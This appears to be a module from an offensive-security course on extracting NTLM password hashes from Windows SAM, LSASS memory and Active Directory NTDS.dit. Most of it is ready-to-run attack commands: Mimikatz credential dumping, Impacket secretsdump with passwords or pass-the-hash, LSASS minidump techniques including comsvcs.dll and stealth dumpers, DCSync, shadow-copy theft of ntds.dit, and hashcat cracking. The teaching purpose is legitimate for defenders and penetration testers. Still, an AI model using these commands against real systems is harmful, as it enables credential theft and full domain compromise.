# NTLM Hash Extraction

## Unit 4 - Topic 1 | Credential Attacks

---

## Overview

**NTLM hash extraction** involves dumping password hashes from Windows systems and Active Directory. NTLM hashes are stored locally in the SAM database and in memory (LSASS process). Once extracted, they enable pass-the-hash attacks without ever knowing the plaintext password.

---

## 1. Where NTLM Hashes Are Stored

```
NTLM HASH LOCATIONS:

LOCAL SYSTEM:
├── SAM Database
│   ├── C:\Windows\System32\config\SAM
│   ├── Contains local user password hashes
│   ├── Encrypted with SYSKEY (from SYSTEM hive)
│   └── Requires SYSTEM/admin privileges to read
│
├── LSASS Process (lsass.exe)
│   ├── Stores credentials in memory
│   ├── NTLM hashes, Kerberos tickets, plaintext (WDigest)
│   ├── Volatile — lost on reboot
│   └── Protected by Credential Guard (if enabled)
│
└── SECURITY Registry Hive
    ├── Cached domain logon credentials
    ├── DCC2 hashes (harder to crack)
    └── Limited to last 10-25 logons

DOMAIN CONTROLLER:
├── NTDS.dit
│   ├── C:\Windows\NTDS\ntds.dit
│   ├── Active Directory database
│   ├── Contains ALL domain user hashes
│   ├── Requires Domain Admin or DCSync
│   └── THE ultimate prize in AD attacks
│
└── SYSVOL (GPP Passwords)
    ├── \\domain\SYSVOL\...\Preferences\
    └── May contain AES-encrypted passwords (known key)
```

---

## 2. Local Hash Extraction

```bash
# === MIMIKATZ (Windows) ===
# Run as Administrator or SYSTEM:
mimikatz.exe
privilege::debug
# Must succeed — need SeDebugPrivilege

# Dump SAM database:
lsadump::sam
# Shows: Username : NTLM hash

# Dump LSASS (in-memory credentials):
sekurlsa::logonpasswords
# Shows: NTLM hashes, Kerberos tickets
# May show PLAINTEXT passwords (WDigest enabled)

# Dump cached domain creds:
lsadump::cache
# DCC2 hashes — very slow to crack

# === SECRETSDUMP (Impacket — from Linux) ===
# Remote SAM dump:
secretsdump.py corp.local/admin:pass@target_ip
# Dumps: SAM, LSA secrets, cached creds, NTDS.dit (if DC)

# With hash (pass-the-hash):
secretsdump.py corp.local/admin@target_ip \
  -hashes :NTLM_HASH

# === CRACKMAPEXEC ===
# Dump SAM:
crackmapexec smb target -u admin -p pass --sam

# Dump LSA secrets:
crackmapexec smb target -u admin -p pass --lsa

# Dump LSASS:
crackmapexec smb target -u admin -p pass -M lsassy

# === REG SAVE (Manual SAM Extraction) ===
# Save SAM and SYSTEM hives:
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
reg save HKLM\SECURITY security.save

# Transfer to attacker machine, then:
secretsdump.py -sam sam.save -system system.save \
  -security security.save LOCAL
```

---

## 3. LSASS Dumping Techniques

```bash
# === METHODS TO DUMP LSASS ===

# 1. MIMIKATZ (Direct):
sekurlsa::logonpasswords

# 2. PROCDUMP (Sysinternals — signed by Microsoft):
procdump.exe -ma lsass.exe lsass.dmp
# Creates minidump → transfer to attacker machine
# Then parse with Mimikatz:
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords

# 3. TASK MANAGER:
# Task Manager → Details → lsass.exe → Create dump file
# Creates dump in %TEMP%

# 4. COMSVCS.DLL (Built-in, no tools needed):
rundll32.exe C:\windows\System32\comsvcs.dll, \
  MiniDump (Get-Process lsass).Id C:\temp\lsass.dmp full

# 5. PYPYKATZ (Python Mimikatz — parse offline):
pypykatz lsa minidump lsass.dmp
# Parse dump files on Linux

# 6. NANODUMP:
# Stealthier LSASS dump using syscalls
.\nanodump.exe --write C:\temp\lsass.dmp

# 7. HANDLEKATZ:
# Uses duplicate handle technique
.\handlekatz.exe --pid lsass_pid
```

---

## 4. Domain Hash Extraction (NTDS.dit)

```bash
# === DCSYNC (Preferred — No file access needed) ===
# Mimikatz:
lsadump::dcsync /user:corp\Administrator
lsadump::dcsync /user:corp\krbtgt
lsadump::dcsync /all /csv
# Requires: DS-Replication-Get-Changes + 
#           DS-Replication-Get-Changes-All rights
# Usually: Domain Admins, Enterprise Admins, DC accounts

# Impacket:
secretsdump.py corp.local/admin:pass@dc01 -just-dc
secretsdump.py corp.local/admin:pass@dc01 \
  -just-dc-user krbtgt

# CrackMapExec:
crackmapexec smb dc01 -u admin -p pass --ntds

# === NTDS.DIT FILE EXTRACTION ===
# Volume Shadow Copy:
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\system.save

# Parse offline:
secretsdump.py -ntds ntds.dit -system system.save LOCAL

# ntdsutil:
ntdsutil "ac i ntds" "ifm" "create full C:\temp\ntds" q q
# Creates: C:\temp\ntds\Active Directory\ntds.dit
#          C:\temp\ntds\registry\SYSTEM
```

---

## 5. Hash Types and Cracking

| Hash Type | Source | Hashcat Mode | Difficulty |
|-----------|--------|:------------:|:----------:|
| **NTLM** | SAM, NTDS.dit | -m 1000 | Easy |
| **NTLMv2** | Network (Responder) | -m 5600 | Medium |
| **DCC2** | Cached creds | -m 2100 | Hard |
| **Kerberos TGS** | Kerberoast | -m 13100 | Medium |
| **Kerberos AS-REP** | AS-REP Roast | -m 18200 | Medium |

```bash
# Crack NTLM:
hashcat -m 1000 ntlm_hashes.txt rockyou.txt

# Crack NTLMv2:
hashcat -m 5600 ntlmv2_hashes.txt rockyou.txt

# Often NO NEED to crack NTLM → Pass-the-Hash instead!
```

---

## Summary Table

| Source | Tool | What You Get |
|--------|------|-------------|
| **SAM** | secretsdump, mimikatz | Local user NTLM hashes |
| **LSASS** | mimikatz, procdump | In-memory creds + tickets |
| **NTDS.dit** | DCSync, secretsdump | ALL domain hashes |
| **Cached** | mimikatz cache | DCC2 hashes (slow to crack) |
| **Network** | Responder | NTLMv2 hashes |

---

## Quick Revision Questions

1. **What is the difference between SAM and NTDS.dit?**
2. **Why is LSASS a valuable target for credential extraction?**
3. **What permissions are needed for DCSync?**
4. **Why might you use pass-the-hash instead of cracking?**
5. **What built-in Windows tools can dump LSASS?**

---

[Next: Pass-the-Hash →](02-pass-the-hash.md)

---

*Unit 4 - Topic 1 of 6 | [Back to README](../README.md)*
